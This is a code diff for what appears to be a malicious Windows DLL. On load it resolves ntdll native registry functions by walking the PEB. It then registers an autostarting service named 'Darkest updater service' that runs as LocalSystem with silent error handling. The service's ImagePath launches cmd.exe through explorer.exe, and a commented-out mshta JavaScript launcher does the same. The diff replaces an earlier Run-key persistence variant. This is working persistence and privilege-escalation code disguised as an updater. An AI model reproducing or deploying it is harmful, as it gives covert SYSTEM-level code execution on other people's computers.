@@ -9,8 +9,9 @@
 #define EXPORT
 #endif
 
+API_TABLE api;
 
-HMODULE GetLibraryBase(const wchar_t * dllName) {
+HMODULE GetLibraryBase(const wchar_t *dllName) {
     //PEB is located at offset 60
     ULONG_PTR peb = __readgsqword(0x60);
 
@@ -38,29 +39,29 @@ HMODULE GetLibraryBase(const wchar_t * dllName) {
     return nullptr;
 }
 
-void* GetProcAddressByHash(HMODULE hModule, const char* targetHash) {
+void *GetProcAddressByHash(HMODULE hModule, const char *targetHash) {
     //Get the DOS headers
-    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
-    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER) hModule;
+    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS) ((BYTE *) hModule + dosHeader->e_lfanew);
 
     //Export dir
     IMAGE_DATA_DIRECTORY exportDirEntry = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
-    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportDirEntry.VirtualAddress);
+    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY) ((BYTE *) hModule + exportDirEntry.VirtualAddress);
 
     //Knowing the export dir, we know the offsets of the three function export tables
-    DWORD* nameArray = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
-    WORD* ordinalArray = (WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals);
-    DWORD* functionArray = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);
+    DWORD *nameArray = (DWORD *) ((BYTE *) hModule + exportDir->AddressOfNames);
+    WORD *ordinalArray = (WORD *) ((BYTE *) hModule + exportDir->AddressOfNameOrdinals);
+    DWORD *functionArray = (DWORD *) ((BYTE *) hModule + exportDir->AddressOfFunctions);
 
     //find the function name through the name export
     for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
         //we have to cast to BYTE * here to force moving forward by one byte at a time
         //RVA -> VA conversion could break otherwise
-        const auto functionName = (char *)((BYTE*)hModule + nameArray[i]);
+        const auto functionName = (char *) ((BYTE *) hModule + nameArray[i]);
         if (strcmp(functionName, targetHash) == 0) {
             const WORD functionOrdinal = ordinalArray[i];
             const DWORD functionRVA = functionArray[functionOrdinal];
-            return (void*)((BYTE*)hModule + functionRVA);
+            return (void *) ((BYTE *) hModule + functionRVA);
         }
     }
     return NULL;
@@ -79,85 +80,118 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
     return TRUE;
 }
 
-
-typedef NTSTATUS (NTAPI *pNtOpenKey)(
-    PHANDLE            KeyHandle,
-    ACCESS_MASK        DesiredAccess,
-    POBJECT_ATTRIBUTES ObjectAttributes
-);
-
-typedef NTSTATUS (NTAPI *pNtSetValueKey)(
-    HANDLE           KeyHandle,
-    PUNICODE_STRING  ValueName,
-    ULONG            TitleIndex,
-    ULONG            Type,
-    PVOID            Data,
-    ULONG            DataSize
-);
-
-typedef NTSTATUS (NTAPI *pNtClose)(
-    HANDLE          KeyHandle
-);
-
+void ArchiveNativeAPIs(HMODULE hNtdll) {
+    // Replace 'ManualExportWalker' with your existing export-walking function
+    api.NtCreateKey = (pNtCreateKey) GetProcAddress(hNtdll, "NtCreateKey");
+    api.NtSetValueKey = (pNtSetValueKey) GetProcAddress(hNtdll, "NtSetValueKey");
+    api.NtClose = (pNtClose) GetProcAddress(hNtdll, "NtClose");
+    api.NtOpenKey = (pNtOpenKey) GetProcAddress(hNtdll, "NtOpenKey");
+}
 
 void OnProcessAttach() {
     HMODULE ntdll = GetLibraryBase(L"ntdll.dll");
-    pNtSetValueKey setKey = (pNtSetValueKey)GetProcAddress(ntdll, "NtSetValueKey");
-    pNtOpenKey openKey = (pNtOpenKey)GetProcAddress(ntdll, "NtOpenKey");
-    pNtClose closeKey = (pNtClose)GetProcAddress(ntdll, "NtClose");
+    ArchiveNativeAPIs(ntdll);
+    RegisterService();
+}
 
+HANDLE CreateRegistryKey() {
+    HANDLE newKeyHandle = NULL;
 
-    UNICODE_STRING registryPath, name;
-    InitUnicodeString(&registryPath, L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
-    auto program = L"C:\\Windows\\System32\\cmd.exe";
-    InitUnicodeString(&name, L"TestingRegistry");
+    UNICODE_STRING registryPath;
+    InitUnicodeString(&registryPath, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\DarkestUpdater");
 
     OBJECT_ATTRIBUTES objAttr;
     InitializeObjectAttributes(&objAttr, &registryPath, 0x00000040 | 0x00000002, NULL, NULL);
 
-    HANDLE hKey = NULL;
-    NTSTATUS openResult = openKey(&hKey, KEY_WRITE | KEY_SET_VALUE, &objAttr);
+    ULONG disp = 0;
 
-    if (openResult == 0) {
-        auto result = setKey(hKey, &name, 0, REG_SZ, (void *) program, (ULONG)((wcslen(program) + 1) * sizeof(WCHAR)));
+    NTSTATUS status = api.NtCreateKey(&newKeyHandle, KEY_ALL_ACCESS, &objAttr, 0, NULL, REG_OPTION_NON_VOLATILE, &disp);
+    if (status == 0) {
+        return newKeyHandle;
+    }
+    return nullptr;
+}
+
+///
+/// @param path - absolute path through the registry
+/// @return the opened handle, or a nullpointer on fail
+HANDLE OpenRegistryKey(PCWSTR path) {
+    UNICODE_STRING registryPath;
+    InitUnicodeString(&registryPath, path);
+
+    OBJECT_ATTRIBUTES objAttr;
+    InitializeObjectAttributes(&objAttr, &registryPath, 0x00000040 | 0x00000002, NULL, NULL);
+
+    HANDLE handle = NULL;
+
+    if (api.NtOpenKey(&handle, OBJ_CASE_INSENSITIVE, &objAttr) == 0)
+        return handle;
+    return nullptr;
+}
+
+NTSTATUS SetRegistryKeyValue(HANDLE keyHandle, PCWSTR name, unsigned long type, void *value,
+                             unsigned long dataSize) {
+    UNICODE_STRING entryName;
+    InitUnicodeString(&entryName, name);
+
+    if (keyHandle != NULL) {
+        auto result = api.NtSetValueKey(keyHandle, &entryName, 0, type, value, dataSize);
         if (result != 0) {
-
             char errorMsg[64];
             sprintf(errorMsg, "Write unsuccessful. NTSTATUS: 0x%08X", result);
             MessageBoxA(nullptr, errorMsg, "ERROR", MB_OK | MB_ICONERROR);
+            api.NtClose(keyHandle);
+            return result;
         }
-    } else {
-        MessageBoxA(nullptr,"Key has not been opened",
-                           "ERROR",
-                           MB_OK | MB_ICONERROR);
+        return 0;
+    }
+    MessageBoxA(nullptr, "Key has not been opened",
+                "ERROR",
+                MB_OK | MB_ICONERROR);
+
+    return api.NtClose(keyHandle);
+}
+
+int RegisterService() {
+    HANDLE keyHandle = CreateRegistryKey();
+    if (keyHandle == NULL) {
+        MessageBoxA(nullptr, "Key has not been created",
+                    "ERROR",
+                    MB_OK | MB_ICONERROR);
+        return -1;
     }
 
+    //wchar_t* imgPath = L"\"C:\\Windows\\System32\\mshta.exe\" javascript:a=new ActiveXObject('WScript.Shell');a.Run('cmd.exe /c whoami > C:\\success.txt',0,false);window.close();";
+    int start = 2; // autorun on start
+    wchar_t* imgPath = L"explorer.exe /root,\"C:\\Windows\\System32\\cmd.exe /c whoami > C:\\success.txt\"";
+    int type = 16; // standalone process
+    int errCont = 0; // do not handle errors, just silently exit
+    wchar_t * objectName = L"LocalSystem"; // forces the service to run as the NT-AUTHORITY/system
+    wchar_t * displayName = L"Darkest updater service";
 
-    closeKey(hKey);
+    SetRegistryKeyValue(keyHandle, L"ImagePath", REG_EXPAND_SZ, imgPath, (wcslen(imgPath) + 1) * sizeof(wchar_t));
+    SetRegistryKeyValue(keyHandle, L"Start", REG_DWORD, &start, sizeof(int));
+    SetRegistryKeyValue(keyHandle, L"Type", REG_DWORD, &type, sizeof(int));
+    SetRegistryKeyValue(keyHandle, L"ErrorControl", REG_DWORD, &errCont, sizeof(int));
+    SetRegistryKeyValue(keyHandle, L"ObjectName", REG_SZ, objectName, (wcslen(objectName) + 1) * sizeof(wchar_t));
+    SetRegistryKeyValue(keyHandle, L"DisplayName", REG_SZ, displayName, (wcslen(displayName) + 1) * sizeof(wchar_t));
+
+    api.NtClose(keyHandle);
+    return 0;
 }
-void Payload() {
-
-}
-
 
 
 void InitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString) {
     if (SourceString) {
-        USHORT length = (USHORT)(wcslen(SourceString) * sizeof(WCHAR));
+        USHORT length = (USHORT) (wcslen(SourceString) * sizeof(WCHAR));
         DestinationString->Length = length;
         DestinationString->MaximumLength = length + sizeof(WCHAR);
-        DestinationString->Buffer = (PWSTR)SourceString;
+        DestinationString->Buffer = (PWSTR) SourceString;
     } else {
         DestinationString->Length = 0;
         DestinationString->MaximumLength = 0;
         DestinationString->Buffer = NULL;
     }
-}
-
-int RegisterService(HMODULE ntdll) {
-
-
-    return 0;
 }
 
 
